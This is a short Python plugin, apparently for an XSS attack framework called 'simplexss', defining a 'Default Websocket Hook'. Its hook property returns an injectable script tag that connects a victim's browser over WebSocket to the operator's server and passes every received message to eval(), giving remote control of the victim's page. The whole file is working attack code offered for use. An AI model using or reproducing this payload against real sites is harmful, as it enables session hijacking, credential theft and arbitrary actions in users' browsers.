from simplexss.api.hooks import BaseHook


class Hook(BaseHook):
    AUTHOR = 'crazyproger1'
    DESCRIPTION = 'Default Websocket hook. Loads payload js via WebSockets and executes in eval().'
    NAME = 'Default Websocket Hook'
    VERSION = '0.1'
    TRANSPORTS = (
        'Default Websocket Transport',
    )

    @property
    def hook(self) -> str:
        return f"<script>c=new WebSocket('{self.environment.url}');c.onmessage=(e)=>eval(e.data);</script>"
